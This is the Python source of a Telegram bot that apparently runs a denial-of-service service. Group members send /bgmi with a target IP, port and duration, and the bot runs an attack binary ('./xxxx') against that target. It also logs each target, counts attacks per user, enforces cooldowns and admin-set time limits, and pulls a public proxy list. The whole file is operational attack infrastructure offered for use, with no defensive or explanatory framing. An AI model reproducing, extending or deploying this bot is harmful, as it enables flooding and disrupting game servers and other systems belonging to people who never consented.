import logging
import subprocess
import asyncio
import itertools
import requests
import os
import time
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, GROUP_ID, GROUP_LINK, DEFAULT_THREADS




# Proxy-related functions
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'
proxy_iterator = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        logging.error(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
        if proxy_iterator is None:  # If proxies are not available
            return None
    return next(proxy_iterator, None)

# Global variables
user_processes = {}
active_attack = False  # Track if an attack is in progress
MAX_DURATION = 240  # Default max attack duration in seconds
user_durations = {}  # Dictionary to store max durations for specific users
# Global variable to store user attack counts
user_attack_counts = {}
# Global variable to store user cooldowns
user_cooldowns = {}



# File paths
USERS_FILE = "users.txt"
LOGS_FILE = "logs.txt"
# Load attack counts from file (if needed)
ATTACKS_FILE = "attacks.txt"

# Ensure commands are executed in the correct group
async def ensure_correct_group(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if update.effective_chat.id != GROUP_ID:
        await update.message.reply_text(f"❌ 𝐭𝐡𝐢ꜱ 𝐛𝐨𝐭 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮ꜱ𝐞𝐝 𝐢𝐧 𝐚 ꜱ𝐩𝐞𝐜𝐢𝐟𝐢𝐜 𝐠𝐫𝐨𝐮𝐩. 𝐣𝐨𝐢𝐧 𝐡𝐞𝐫𝐞:- {GROUP_LINK}")
        return False
    return True

# Read users from file
def read_users():
    try:
        if not os.path.exists(USERS_FILE):
            return []
        with open(USERS_FILE, "r") as f:
            users = []
            for line in f:
                parts = line.strip().split(",")
                if len(parts) == 2:
                    users.append(parts)
            return users
    except Exception as e:
        logging.error(f"Error reading users file: {str(e)}")
        return []

# Save user information
async def save_user_info(user_id, username):
    try:
        existing_users = {}
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r") as f:
                for line in f:
                    parts = line.strip().split(",")
                    if len(parts) == 2:
                        uid, uname = parts
                        existing_users[uid] = uname

        if str(user_id) not in existing_users:
            with open(USERS_FILE, "a") as f:
                f.write(f"{user_id},{username}\n")
    except Exception as e:
        logging.error(f"Error saving user info: {str(e)}")


def load_attack_counts():
    global user_attack_counts
    if os.path.exists(ATTACKS_FILE):
        try:
            with open(ATTACKS_FILE, "r") as f:
                for line in f:
                    uid, count = line.strip().split(",")
                    user_attack_counts[int(uid)] = int(count)
        except Exception as e:
            logging.error(f"Error loading attack counts: {str(e)}")

def save_attack_counts():
    try:
        with open(ATTACKS_FILE, "w") as f:
            for uid, count in user_attack_counts.items():
                f.write(f"{uid},{count}\n")
    except Exception as e:
        logging.error(f"Error saving attack counts: {str(e)}")

# Save attack logs
async def save_attack_log(user_id, target_ip, port, duration):
    global user_attack_counts
    try:
        with open(LOGS_FILE, "a") as f:
            f.write(f"User: {user_id}, Target: {target_ip}:{port}, Duration: {duration}s\n")
        
        # Increment user attack count
        if user_id in user_attack_counts:
            user_attack_counts[user_id] += 1
        else:
            user_attack_counts[user_id] = 1
        
        # Save updated attack counts
        save_attack_counts()
    except Exception as e:
        logging.error(f"Error saving attack log: {str(e)}")


async def attacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨ꜱ𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
        return

    # Load attack data
    load_attack_counts()

    # Prepare attack report
    report_lines = []
    grand_total = 0

    for uid, count in user_attack_counts.items():
        # Default values
        username = "Unknown"
        display_name = "Unknown"

        # Find user info
        for u_id, u_name in read_users():
            if int(u_id) == uid:
                username = u_name  # Extract username
                user = await context.bot.get_chat(uid)  # Fetch user info
                display_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
                break

        report_lines.append(
            f"𝗨𝗜𝗗:-   {uid}, \n𝗡𝗔𝗠𝗘​:-   {display_name}, \n𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘​:-   @{username}, \n𝗔𝗧𝗧𝗔𝗖𝗞𝗦​:-   {count}\n **************************"
        )
        grand_total += count

    # Add grand total
    report_lines.append(f"\n👥 ​𝗧𝗢𝗧𝗔𝗟 𝗔𝗧𝗧𝗔𝗖𝗞𝗦​:- {grand_total}")

    # Send report
    if report_lines:
        await update.message.reply_text("\n".join(report_lines))
    else:
        await update.message.reply_text("⚠️ 𝐧𝐨 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐚𝐭𝐚 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞.")


async def start_attack(target_ip, port, duration, user_id, original_message, context):
    global active_attack
    command = ['./xxxx', target_ip, str(port), str(duration)]

    try:
        process = await asyncio.create_subprocess_exec(*command)
        if not process:
            return  # Silently exit if subprocess creation fails

        user_processes[user_id] = {
            "process": process,
            "target_ip": target_ip,
            "port": port,
            "duration": duration
        }

        await asyncio.wait_for(process.wait(), timeout=duration)

        del user_processes[user_id]
        active_attack = False  # Reset the flag after the attack finishes

        try:
            await original_message.reply_text(f"✅ 𝐚𝐭𝐭𝐚𝐜𝐤 𝐟𝐢𝐧𝐢𝐬𝐡𝐞𝐝 𝐨𝐧​ {target_ip}:{port} 𝐟𝐨𝐫 {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.")
        except Exception:
            pass  # Silently ignore all errors when sending the reply

    except asyncio.TimeoutError:
        if process and process.returncode is None:
            process.terminate()
            await process.wait()
        if user_id in user_processes:
            del user_processes[user_id]
        active_attack = False
        try:
            await context.bot.send_message(
                chat_id=GROUP_ID,  # Send the message to the group
                text=f"⚠️ 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐞𝐫𝐦𝐢𝐧𝐚𝐭𝐞𝐝 𝐚ꜱ 𝐢𝐭 𝐞𝐱𝐜𝐞𝐞𝐝𝐞𝐝 𝐭𝐡𝐞 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐨𝐧 {target_ip}:{port}."
            )
        except Exception:
            pass

    except Exception:
        if user_id in user_processes:
            del user_processes[user_id]
        active_attack = False

# Start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return
    await update.message.reply_text("👋 𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐭𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤 𝐛𝐨𝐭!\n 𝐮𝐬𝐞 /𝐛𝐠𝐦𝐢 <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞> 𝐭𝐨 𝐬𝐭𝐚𝐫𝐭 𝐚𝐧 𝐚𝐭𝐭𝐚𝐜𝐤")

# BGMI command handler
# BGMI command handler with single attack restriction
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global active_attack
    if not await ensure_correct_group(update, context):
        return

    user = update.message.from_user
    user_id = user.id
    username = user.username or "Unknown"

    await save_user_info(user_id, username)

    current_time = time.time()
    cooldown_time = 600  # Cooldown period in seconds (10 minutes)

    # Check if an attack is already in progress
    if active_attack:
        await update.message.reply_text(
            "🚫 ​𝐚𝐧 𝐚𝐭𝐭𝐚𝐜𝐤 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐢𝐧 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬. 𝐩𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐟𝐨𝐫 𝐭𝐡𝐞 𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐨 𝐟𝐢𝐧𝐢𝐬𝐡 𝐛𝐞𝐟𝐨𝐫𝐞 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐚 𝐧𝐞𝐰 𝐨𝐧𝐞."
        )
        return

    # Check if the user is on cooldown
    if user_id in user_cooldowns:
        time_since_last_attack = current_time - user_cooldowns[user_id]
        if time_since_last_attack < cooldown_time:
            remaining_time = int(cooldown_time - time_since_last_attack)
            await update.message.reply_text(f"⏳ 𝐲𝐨𝐮 𝐦𝐮𝐬𝐭 𝐰𝐚𝐢𝐭​ {remaining_time} ​𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐛𝐞𝐟𝐨𝐫𝐞 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐚𝐧𝐨𝐭𝐡𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤​.")
            return

    if len(context.args) != 3:
        await update.message.reply_text("🛡️ 𝐮𝐬𝐞 /𝐛𝐠𝐦𝐢 <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞> 𝐭𝐨 𝐬𝐭𝐚𝐫𝐭 𝐚𝐧 𝐚𝐭𝐭𝐚𝐜𝐤​")
        return

    target_ip = context.args[0]
    try:
        port = int(context.args[1])
        duration = int(context.args[2])
    except ValueError:
        await update.message.reply_text("⚠️ 𝐩𝐨𝐫𝐭 𝐚𝐧𝐝 𝐭𝐢𝐦𝐞 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐢𝐧𝐭𝐞𝐠𝐞𝐫𝐬​.")
        return

    max_duration = user_durations.get(user_id, MAX_DURATION)
    if duration > max_duration:
        await update.message.reply_text(f"⚠️ ​𝐲𝐨𝐮𝐫 𝐦𝐚𝐱 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞 𝐢𝐬​ {max_duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐚𝐭 𝐬𝐞𝐭 𝐛𝐲 𝐭𝐡𝐞 𝐚𝐝𝐦𝐢𝐧​.")
        duration = max_duration

    # Log the attack, update cooldown, and mark the attack as active
    user_cooldowns[user_id] = current_time  # Set cooldown for the user
    active_attack = True  # Mark the attack as active
    await save_attack_log(user_id, target_ip, port, duration)

    # Notify users and start the attack
    attack_message = await update.message.reply_text(
        f"🚀 ​𝐚𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐨𝐧​ {target_ip}:{port} 𝐟𝐨𝐫 {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐰𝐢𝐭𝐡​ {DEFAULT_THREADS} 𝐭𝐡𝐫𝐞𝐚𝐝𝐬."
    )
    asyncio.create_task(start_attack(target_ip, port, duration, user_id, attack_message, context))

    # Reset active_attack once the attack finishes
    async def reset_attack_status():
        global active_attack
        await asyncio.sleep(duration)
        active_attack = False

    asyncio.create_task(reset_attack_status())


# Set max duration command (Admin-only)
async def set_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
        return

    if len(context.args) != 2:
        await update.message.reply_text("🛡️ 𝐮ꜱ𝐚𝐠𝐞: /𝐬𝐞𝐭 <𝐮𝐢𝐝/𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞> <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧>")
        return

    try:
        target = context.args[0]
        duration = int(context.args[1])

        if target.isdigit():
            user_durations[int(target)] = duration
        else:
            user_found = False
            for uid, uname in read_users():
                if uname == target:
                    user_durations[int(uid)] = duration
                    user_found = True
                    break
            if not user_found:
                await update.message.reply_text("⚠️ 𝐮ꜱ𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.")
                return

        await update.message.reply_text(f"✅ 𝐦𝐚𝐱 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐬𝐞𝐭 𝐭𝐨 {duration} 𝐬𝐞𝐜𝐨𝐧𝐝ꜱ 𝐟𝐨𝐫 {target}.")
    except ValueError:
        await update.message.reply_text("⚠️ 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚𝐧 𝐢𝐧𝐭𝐞𝐠𝐞𝐫.")

# View logs command (Admin-only)
async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
        return

    try:
        with open(LOGS_FILE, "r") as f:
            logs = f.read()
        await update.message.reply_text(f"📊 Attack logs:\n{logs}")
    except Exception as e:
        await update.message.reply_text("⚠️ 𝐧𝐨 𝐥𝐨𝐠𝐬 𝐚𝐯𝐢𝐥𝐚𝐛𝐞.")

# View users command (Admin-only)
async def users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
        return

    try:
        with open(USERS_FILE, "r") as f:
            users = f.read()
        await update.message.reply_text(f"👥 Users:\n{users}")
    except Exception as e:
        await update.message.reply_text("⚠️ 𝐧𝐨 𝐮𝐬𝐞𝐫𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞.")

# Main application setup
if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("set", set_duration))
    app.add_handler(CommandHandler("logs", logs))
    app.add_handler(CommandHandler("users", users))
    app.add_handler(CommandHandler("attacks", attacks))  # New command
    app.run_polling()
